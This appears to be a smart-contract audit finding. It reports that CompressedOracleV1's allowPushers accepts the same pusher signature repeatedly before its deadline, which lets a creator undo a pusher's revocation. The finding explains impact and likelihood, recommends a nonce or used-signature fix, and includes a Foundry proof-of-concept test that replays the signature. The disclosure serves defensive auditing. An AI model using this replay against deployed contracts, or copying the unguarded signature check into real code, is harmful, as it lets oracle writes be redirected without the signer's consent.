### Title
Pusher Delegation Signature Replay Allows Creator to Re-Establish Revoked Consent Before Deadline - (File: smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol)

---

### Summary

`allowPushers` in `CompressedOracleV1` verifies an EIP-191 signature from the pusher but never marks that signature as consumed. The same valid signature can be submitted multiple times before its `deadline` expires. A creator who holds a pusher's signed consent can replay it to silently re-establish delegation immediately after the pusher calls `revokePusher()`, nullifying the revocation and continuing to redirect the pusher's oracle writes into the creator's namespace without the pusher's knowledge.

---

### Finding Description

`allowPushers` constructs a signed digest over `(chainid, address(this), deadline, pusher, msg.sender)` and verifies it with ECDSA, then unconditionally writes `namespaceRemapping[pusher] = msg.sender`: [1](#0-0) 

The only replay guard is the `deadline` check via `_ensureDeadline(deadline)`. There is no nonce, no used-signature bitmap, and no per-pusher revocation counter. Confirmed by a grep across all production contracts — no `usedSignature`, `nonce`, or equivalent mapping exists anywhere in `smart-contracts-poc/contracts/`.

The code's own NatSpec acknowledges the deadline was added specifically to prevent re-establishment after revocation: [2](#0-1) 

But the deadline only prevents use **after** expiry. It does not prevent the same signature from being submitted **multiple times before** the deadline. The revocation path clears the mapping: [3](#0-2) 

Because the signature is not invalidated on first use, the creator can immediately call `allowPushers` again with the identical signature bytes, re-writing `namespaceRemapping[pusher] = creator` and undoing the revocation.

---

### Impact Explanation

After the pusher calls `revokePusher()` they believe their `fallback()` pushes land in their **own** namespace. The `fallback` path resolves the namespace at call time: [4](#0-3) 

If the creator has already replayed the signature, `namespaceRemapping[pusher]` is again set to `creator`, so every subsequent push by the pusher silently lands in the **creator's** namespace — the namespace that price providers and pools read from. The pusher has no on-chain mechanism to prevent this until the deadline expires.

Concrete oracle-integrity consequence: a pusher who revokes because they detected a data quality problem (stale feed, wrong decimals, compromised key) cannot stop their writes from reaching the creator's production namespace and therefore the pools that consume it. A malicious creator can sustain unauthorized write authority over their namespace for the entire duration of the original deadline window, feeding prices into pools from a pusher who explicitly withdrew consent.

---

### Likelihood Explanation

- The creator already holds the pusher's signature (they needed it to call `allowPushers` the first time).
- Replaying requires a single additional `allowPushers` call — no special privilege, no new signature, no front-running.
- The window is the full deadline duration chosen at signing time (e.g., 1 day, 7 days), which is entirely at the creator's discretion when they originally requested the signature.
- The pusher has no on-chain way to detect or prevent the replay short of monitoring every block.

---

### Recommendation

Track consumed signatures with a `mapping(bytes32 => bool) private _usedDelegationSigs` and revert if the digest has already been seen:

```solidity
mapping(bytes32 => bool) private _usedDelegationSigs;

// inside allowPushers, after recovering the signer:
require(!_usedDelegationSigs[hash], "signature already used");
_usedDelegationSigs[hash] = true;
```

Alternatively, introduce a per-pusher revocation nonce (`mapping(address => uint256) public pusherNonce`) that is incremented on every `revokePusher` call and included in the signed digest, so any pre-revocation signature is automatically invalidated.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract SignatureReplayPoC is Test {
    CompressedOracleV1 oracle;

    uint256 constant PUSHER_KEY = 0xBEEF;
    address pusher;
    address creator = address(0xC0FFEE);

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 0);
        pusher = vm.addr(PUSHER_KEY);
        vm.warp(1_700_000_000);
    }

    function testSignatureReplayNullifiesRevocation() public {
        uint256 deadline = block.timestamp + 1 days;

        // 1. Pusher signs consent once.
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // 2. Creator delegates pusher.
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator);

        // 3. Pusher revokes.
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0), "revoked");

        // 4. Creator replays the SAME signature — no new consent needed.
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs); // succeeds — no replay guard

        // 5. Revocation is nullified; pusher's writes still land in creator's namespace.
        assertEq(oracle.namespaceRemapping(pusher), creator, "delegation re-established without pusher consent");
    }
}
```

The test passes against the current production code, confirming that `revokePusher` provides no durable protection while a valid pre-signed `allowPushers` signature remains within its deadline window.

```text
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```
